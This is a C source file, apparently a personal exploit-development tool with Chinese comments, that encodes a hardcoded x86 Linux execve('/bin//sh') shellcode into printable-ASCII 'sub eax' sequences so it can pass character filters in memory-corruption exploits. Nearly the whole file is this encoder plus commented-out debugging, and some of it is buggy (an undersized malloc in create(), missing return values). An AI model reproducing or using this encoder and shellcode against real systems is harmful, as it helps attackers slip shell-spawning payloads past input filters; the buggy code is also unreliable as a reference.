#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct RESULT_BYTE {
	int overflow; // 进位的个数
	unsigned char a;
	unsigned char b;
	unsigned char c;
};

struct RESULT{
	int result_a;
	int result_b;
	int result_c;
};

unsigned char *getMAX(unsigned char *a, unsigned char *b, unsigned char *c){
	unsigned char *MAX = a;
	if (*b > *MAX){
		MAX = b;
	}
	if (*c > *MAX){
		MAX = c;
	}
	return MAX;
}

unsigned char *getMIN(unsigned char *a, unsigned char *b, unsigned char *c){
	unsigned char *MIN = a;
	if (*b < *MIN){
		MIN = b;
	}
	if (*c < *MIN){
		MIN = c;
	}
	return MIN;
}

struct RESULT_BYTE * searchByte(unsigned char target, unsigned char LEFT, unsigned char RIGHT){
	unsigned char LEFT_A = LEFT;
	unsigned char RIGHT_A = RIGHT;
	//unsigned char a = LEFT_A + (RIGHT_A - LEFT_A) / 2;
	unsigned char a = LEFT_A;// + (RIGHT_A - LEFT_A) / 2;

	unsigned char LEFT_B = LEFT;
	unsigned char RIGHT_B = RIGHT;
	//unsigned char b = LEFT_B + (RIGHT_B - LEFT_B) / 2;
	unsigned char b = LEFT_B;// + (RIGHT_B - LEFT_B) / 2;

	unsigned char LEFT_C = LEFT;
	unsigned char RIGHT_C = RIGHT;
	//unsigned char c = LEFT_C + (RIGHT_C - LEFT_C) / 2;
	unsigned char c = LEFT_C;// + (RIGHT_C - LEFT_C) / 2;

	int counter = 0;

	while(counter++ < 0xFF){
		// printf("[TIMES] : [%x]\n", counter);
		// printf("[%d] [%d] [%d]\n", a, b, c);
		unsigned char temp = (a + b + c); // 计算和
		unsigned char *pointer;
				if (temp > target){
					pointer = getMAX(&a, &b, &c);	
					*pointer = *pointer - 1;
				}else if(temp < target){
					pointer = getMIN(&a, &b, &c);	
					*pointer = *pointer + 1;
				}else{
					if (a < 0x20 || b < 0x20 || c < 0x20){
						printf("[%x][%x][%x] : 不在范围内 , 自动补 85", a, b, c);
						// 缠绕一圈
						a += 85;
						b += 85;
						c += 86;
						printf("[%x][%x][%x]\n", a, b, c);
					}
					
					struct RESULT_BYTE * result = malloc(sizeof(struct RESULT_BYTE));
					memset(result, 0, sizeof(struct RESULT_BYTE));
					result->a = a;
					result->b = b;
					result->c = c;
					int temp = a + b + c;
					result->overflow = temp / 0x100;
					// printf("[FOUND] : 0x%2x + 0x%2x + 0x%2x [OVER] : %d\n", a, b, c, temp / 0x100);

					return result;
				}
	}
}

struct RESULT * search(int target){
	
	struct RESULT * result = malloc(sizeof(struct RESULT));
	memset(result, 0, sizeof(struct RESULT));
	unsigned char byte_l = (target >> 0) % 0x100;
	unsigned char byte_ml = (target >> 8) % 0x100;
	unsigned char byte_mh = (target >> 16) % 0x100;
	unsigned char byte_h = (target >> 24) % 0x100;
	int overflow = 0;

	struct RESULT_BYTE * result_byte = NULL;
	// printf("-------------------------\n");
	// printf("Searching : [%d] = [0x%x]\n", byte_l, byte_l);
	result_byte = searchByte(byte_l, 0x20, 0x7f);
	result->result_a = result->result_a + result_byte->a;//
	result->result_b = result->result_b + result_byte->b;//
	result->result_c = result->result_c + result_byte->c;//
	overflow = result_byte->overflow;
	free(result_byte);

	// printf("-------------------------\n");
	// printf("Searching : [%d] = [0x%x]\n", byte_ml, byte_ml);
	result_byte = searchByte(byte_ml - overflow, 0x20, 0x7f);
	result->result_a = result->result_a + result_byte->a * 0x100;//
	result->result_b = result->result_b + result_byte->b * 0x100;//
	result->result_c = result->result_c + result_byte->c * 0x100;//
	overflow = result_byte->overflow;
	free(result_byte);
	// printf("-------------------------\n");
	// printf("Searching : [%d] = [0x%x]\n", byte_mh, byte_mh);
	result_byte = searchByte(byte_mh - overflow, 0x20, 0x7f);
	result->result_a = result->result_a + result_byte->a * 0x10000;//
	result->result_b = result->result_b + result_byte->b * 0x10000;//
	result->result_c = result->result_c + result_byte->c * 0x10000;//
	overflow = result_byte->overflow;
	free(result_byte);
	//printf("-------------------------\n");
	//printf("Searching : [%d] = [0x%x]\n", byte_h, byte_h);
	result_byte = searchByte(byte_h - overflow, 0x20, 0x7f);
	result->result_a = result->result_a + result_byte->a * 0x1000000;//
	result->result_b = result->result_b + result_byte->b * 0x1000000;//
	result->result_c = result->result_c + result_byte->c * 0x1000000;//
	overflow = result_byte->overflow;
	free(result_byte);
	// printf("-------------------------\n");
	return result;
}

unsigned char * build(unsigned char *shellcode){
	int length = (strlen(shellcode) / 4 + 1) * 4;
	// printf("[RESULT_LENGTH] : %d\n", length);
	unsigned char *result = malloc(length); // 假设 shellcode 已经去掉了 0 字节
	memset(result, 0, length);
	//int i = 0;
	/*
	// 复制
	for (i = 0; i < strlen(shellcode); i++){
		result[length - i] = 0x100000000 - shellcode[strlen(shellcode) - i];	
	}
	// 开始搜索
	for (i = 0; i < length; i += 4){
		int *target = (int *)&result[i];
		printf("[Begin] ==> [0x%8x]\n", *target);
		struct RESULT * result = search(*target);
		printf("sub %xH\nsub %xH\nsub %xH\n", result->result_a, result->result_b, result->result_c);
		printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
		free(result);
		
	}
	*/

	return result;
}

char * create(char * shellcode){
		int length = (strlen(shellcode) / 4 + 1) * 4;
		// 第一步 : 申请 shellcode 补为 4 字节倍数的内存
		char * result = malloc(sizeof(length)); // 应该是 24
		// 第二部 : 设置为 0x90
		memset(result, 0x90, length);
		// 第三部 : 将shellcode逆序存放
		int i = 0;
		for(i = 0; i < strlen(shellcode); i ++){
			result[i] = shellcode[strlen(shellcode) - 1 - i];
			// printf("A : shellcode[%d] = [%2x] -> result[%d] = [0x%2x]\n", i, shellcode[i], length - i, result[length - i]);
		}
		unsigned int *pointer = NULL;
		for (i = 0; i < length; i+=4){
			/// printf("result[%d] = [0x%2x]\n", i, result[i]);
			pointer = (int *)&result[i];
			printf("pointer -> [%x]; result[%d] = [0x%2x]\n",*pointer, i, result[i]);

		}
		// 第二部 : 四字节取 , 取得之后 , 2**32 - number 得到 target
		/*
		unsigned int *target = NULL;
		for (i = 0; i < strlen(shellcode); i += 4 ){
			target = (unsigned int *)&result[i];
			printf("[Target] : %x\n", *target);
					
			struct RESULT * result = search(*target);
			printf("[Target] : 0x%x\n", *target);
			printf("[FOUND] : \n");
			printf("[0x%x] [0x%x] [0x%x]\n", result->result_a, result->result_b, result->result_c);
			printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
			free(result);
		}
		*/
}

unsigned char * temp(char * shellcode){
	int length_shellcode = strlen(shellcode);
	int length_malloc = (length_shellcode / 4 + 1) * 4;
	char * pointer = malloc(length_malloc);
	memset(pointer, 0x90, length_malloc);
	int i = 0;
	for(i = 0; i < length_shellcode; i++){
		pointer[i] = shellcode[length_shellcode - i - 1];	
	}
	int *target = (int *)pointer;
	for (i = 0; i < (length_malloc / 4); i++){
		// printf("target[%d] -> [%x]\n", i, *target);
		/* 开始算 */
		search(*target);
		struct RESULT * result = search(*target);
		 printf("[Target] : 0x%x\n", *target);
		// printf("[FOUND] : \n");
		//printf("[0x%x] [0x%x] [0x%x]\n", result->result_a, result->result_b, result->result_c);
		printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
		free(result);
		/* 处理下四个字节 */
		target++;
	}
}

void check(int target){

	struct RESULT * result = search(target);
	printf("[Target] : 0x%x\n", target);
	printf("[FOUND] : \n");
	printf("[0x%x] [0x%x] [0x%x]\n", result->result_a, result->result_b, result->result_c);
	printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
	printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
	free(result);

}

int main(){
	char *shellcode = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80";
	temp(shellcode);
	
	// check(0x0b6ae389);
	// check(0x80cd9958);
	// check(0x6e69622f);
	// check(0x6868732f);
	//check(0x2f6851c9);
	//check(0x31909090);
	//check(0x90909090);
	// int target = 0x6f6f6f70;
	//	int target = 0x6e69622f;
	/*
	struct RESULT * result = search(target);
	printf("[Target] : 0x%x\n", target);
	printf("[FOUND] : \n");
	printf("[0x%x] [0x%x] [0x%x]\n", result->result_a, result->result_b, result->result_c);
	printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
	printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
	free(result);

	// struct RESULT * _result = search(target);
	printf("[Target] : 0x%x\n", target);
	printf("[FOUND] : \n");
	printf("[0x%x] [0x%x] [0x%x]\n", _result->result_a, _result->result_b, _result->result_c);
	printf("0x%x + 0x%x + 0x%x\n", _result->result_a, _result->result_b, _result->result_c);
	printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", _result->result_a, _result->result_b, _result->result_c);
	free(_result);
*/
/*
	struct RESULT * _result = search(target);
	printf("[Target] : 0x%x\n", target);
	printf("[FOUND] : \n");
	printf("[0x%x] [0x%x] [0x%x]\n", result->result_a, result->result_b, result->result_c);
	printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
	printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
	free(result);
*/
	}

// 产生一个问题 :
// C语言在计算立即数的时候的内存是怎么分配的
